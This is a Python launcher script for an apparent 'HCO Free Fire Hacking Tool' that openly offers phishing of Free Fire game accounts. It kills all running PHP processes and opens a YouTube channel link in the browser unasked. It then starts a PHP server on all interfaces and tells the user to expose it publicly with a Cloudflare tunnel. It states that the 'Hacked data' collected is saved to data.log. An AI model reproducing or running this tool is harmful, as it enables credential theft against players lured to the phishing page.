import os
import time
from termcolor import colored

def clear(): os.system('clear')

def type_print(text, color='cyan', delay=0.01):
    for char in text:
        print(colored(char, color), end='', flush=True)
        time.sleep(delay)
    print()

def intro():
    os.system("pkill php")  # Kills all running PHP servers
    clear()
    print(colored("""
              /$$   /$$  /$$$$$$   /$$$$$$ 
             | $$  | $$ /$$__  $$ /$$__  $$
             | $$  | $$| $$  \__/| $$  \ $$
             | $$$$$$$$| $$      | $$  | $$
             | $$__  $$| $$      | $$  | $$
             | $$  | $$| $$    $$| $$  | $$
             | $$  | $$|  $$$$$$/|  $$$$$$/
             |__/  |__/ \______/  \______/
    """, 'red'))
    
    
    print(colored("Subscribe Our Channel to use this tool For Free!", "yellow"))

    print(colored("\nRedirecting to our YouTube channel...", "magenta"))
    time.sleep(2)

    # Replace this with your actual channel link
    os.system("xdg-open https://youtube.com/@hackers_colony_tech?si=4ShUWvlCJUNi749h")
    time.sleep(5)
    logoo = """
      
          
                    ██╗  ██╗ ██████╗ ██████╗ 
                    ██║  ██║██╔════╝██╔═══██╗
                    ███████║██║     ██║   ██║
                    ██╔══██║██║     ██║   ██║
                    ██║  ██║╚██████╗╚██████╔╝
                    ╚═╝  ╚═╝ ╚═════╝ ╚═════╝ 
         
           
      ███████╗███████╗    ██████╗ ██╗  ██╗██╗███████╗██╗  ██╗
      ██╔════╝██╔════╝    ██╔══██╗██║  ██║██║██╔════╝██║  ██║
      █████╗  █████╗      ██████╔╝███████║██║███████╗███████║
      ██╔══╝  ██╔══╝      ██╔═══╝ ██╔══██║██║╚════██║██╔══██║
      ██║     ██║         ██║     ██║  ██║██║███████║██║  ██║
      ╚═╝     ╚═╝         ╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚═╝  ╚═╝
                                                       


"""
    os.system("clear")
    type_print(logoo)
    type_print("               __HCO Free Fire Hacking Tool__", 'yellow')
    print(colored("         >> By Azhar | Hackers Colony Official <<", 'cyan'))
    print(colored("\n     Tool to Hack Free Fire Id via Cloudflare Tunnel\n", 'green'))

def show_menu():
    print(colored("[1] Start FF Phishing", "yellow"))
    print(colored("[2] Exit", "red"))

def start_server():
    port = input(colored("\nEnter port (default 8080): ","green")).strip()
    if not port:
        port = "8080"
    print(colored(f"\n[+] Starting local PHP server on http://0.0.0.0:{port} ...", "green"))
    time.sleep(1)
    os.system(f"php -S 0.0.0.0:{port} &")
    time.sleep(2)
    print(colored("\n[!] Now open another terminal and run this command:", "cyan"))
    print(colored(f"cloudflared tunnel --url http://localhost:{port}", "magenta"))
    
    
    print(colored("\nYour Hacked data will be saved in data.log\n","yellow"))

def main():
    intro()
    while True:
        show_menu()
        choice = input(colored("\nEnter your choice [1-2]: ", "blue"))
        if choice == "1":
            start_server()
            break
        elif choice == "2":
            print(colored("\nExiting... Bye Hacker!", "red"))
            time.sleep(1)
            break
        else:
            print(colored("Invalid input. Try again.\n", "red"))

if __name__ == "__main__":
    main()
